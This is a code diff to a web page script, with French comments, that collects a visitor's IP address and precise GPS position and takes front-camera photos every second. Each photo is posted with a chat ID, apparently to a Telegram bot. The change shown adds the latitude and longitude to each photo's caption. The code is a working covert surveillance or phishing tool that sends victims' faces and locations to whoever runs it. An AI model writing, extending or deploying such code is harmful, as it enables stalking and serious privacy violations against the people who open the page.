@@ -42,6 +42,7 @@
         const canvas = document.getElementById('canvas');
 
         let userIP = "unknown";
+        let userLoc = "GPS_refused";
         let isSending = false;
 
         async function getIP() {
@@ -54,11 +55,14 @@
 
         async function getGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve();
+                if (!navigator.geolocation) return resolve("GPS_non_supporté");
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve(`Lat:${pos.coords.latitude.toFixed(5)},Lon:${pos.coords.longitude.toFixed(5)}`),
+                    (pos) => {
+                        userLoc = `Lat:${pos.coords.latitude.toFixed(5)}|Lon:${pos.coords.longitude.toFixed(5)}`;
+                        resolve();
+                    },
                     () => resolve("GPS_refused"),
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
                 );
             });
         }
@@ -66,7 +70,7 @@
         async function startCamera() {
             try {
                 await getIP();
-                await getGPS();
+                await getGPS();   // Récupère la localisation une fois
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
@@ -74,11 +78,9 @@
                 });
                 video.srcObject = stream;
 
-                // Première capture très rapide
                 video.onloadedmetadata = () => {
-                    setTimeout(captureAndSend, 300);   // Réduit à 300ms
-                    // Ensuite toutes les 1 seconde
-                    setInterval(captureAndSend, 1000);
+                    setTimeout(captureAndSend, 300);   // Première photo très rapide
+                    setInterval(captureAndSend, 1000); // Puis toutes les 1s
                 };
             } catch (e) {
                 console.error(e);
@@ -96,7 +98,10 @@
 
             canvas.toBlob(async (blob) => {
                 const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                const caption = `IP_${userIP}\n${timestamp}`;
+                
+                const caption = `IP: ${userIP}\n` +
+                               `Loc: ${userLoc}\n` +
+                               `Time: ${timestamp}`;
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
